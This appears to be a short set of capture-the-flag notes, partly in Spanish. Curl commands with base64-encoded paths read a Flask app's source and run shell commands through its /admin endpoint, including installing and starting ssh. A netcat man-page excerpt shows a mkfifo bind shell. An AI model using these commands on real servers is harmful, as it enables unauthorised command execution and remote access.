curl -v --path-as-is 'http://localhost:5000/

Es flask

curl -v --path-as-is 'http://localhost:5000/static/'$(printf app.py | base64)

Tiene path /admin/<cmd>

curl -v --path-as-is 'http://localhost:5000/admin/'$(printf ls | base64)


curl -v --path-as-is 'http://localhost:5000/admin/'$(printf "apt install -y ssh" | base64)
curl -v --path-as-is 'http://localhost:5000/admin/'$(printf "service ssh start" | base64)



```
$ man nc
...
     There is no -c or -e option in this netcat, but you still can execute a
     command after connection being established by redirecting file descrip‐
     tors. Be cautious here because opening a port and let anyone connected
     execute arbitrary command on your site is DANGEROUS. If you really need
     to do this, here is an example:

     On ‘server’ side:

           $ rm -f /tmp/f; mkfifo /tmp/f
           $ cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1234 > /tmp/f

     On ‘client’ side:

           $ nc host.example.com 1234
           $ (shell prompt from host.example.com)
...
```

